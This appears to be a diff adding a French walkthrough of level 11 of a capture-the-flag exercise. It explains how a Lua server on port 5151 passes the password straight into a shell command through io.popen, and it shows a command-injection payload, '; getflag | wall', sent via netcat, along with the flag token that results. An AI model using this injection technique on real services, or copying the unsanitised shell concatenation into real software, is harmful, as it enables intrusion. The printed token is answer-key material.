@@ -1,0 +1,59 @@
+-----------------------------------------------------------
+                          LEVEL11
+-----------------------------------------------------------
+
+1. On regarde les fichiers mis à notre disposition :
+   --------------------------------------------------------
+   CMD : ls
+   OUTPUT : level11.lua
+
+2. On cat le contenu du script level.lua. Ce dernier 
+   contient un code socket pour ouvrir une écoute sur le 
+   port 5151. On constate également que pour pouvoir
+   écouter via ce port il faut spécifier un mot de passe
+   qui, lorsque hasher via la fonction sha1sum, contient : 
+   f05d1d066fb246efe0c6f7d095f909a7a0cf34a0
+   --------------------------------------------------------
+   CMD : cat level11.lua
+   OUTPUT : [...]
+            local server = assert(socket.bind("127.0.0.1", 5151))
+            [...]
+            function hash(pass)
+               prog = io.popen("echo "..pass.." | sha1sum", "r")
+               data = prog:read("*all")
+               prog:close()
+               data = string.sub(data, 1, 40)
+               return data
+            end
+            [...]
+            if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
+               client:send("Erf nope..\n");
+            [...]
+
+3. En exécutant le script level11.lua :
+   --------------------------------------------------------
+   CMD : lua leve11.lua
+   OUTPUT : address already in use
+
+4. De fait, on passe par netcat avec pour port 5151 pour
+   directement s'y connecté (ce qui confirme la nécessité
+   d'un mot de passe) :
+   --------------------------------------------------------
+   CMD : nc localhost 5151 
+   OUTPUT : Password:
+
+5. Le mot de passe (pass) etant directement concatené par
+   io.popen("echo "..pass.." | sha1sum", "r") dans le script 
+   level11.lua, on peut facilement l'utiliser pour injecter 
+   du code. La commande wall, dans l'injection ci-dessous,
+   va se charger d'envoyer le retour de getflag a tous 
+   les utilisateur :
+   --------------------------------------------------------
+   CMD : echo '; getflag | wall' | nc localhost 5151
+   OUTPUT : Broadcast Message from flag11@Snow
+            (somewhere) at 13:38 ...
+
+            Check flag.
+            Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+            Erf nope..
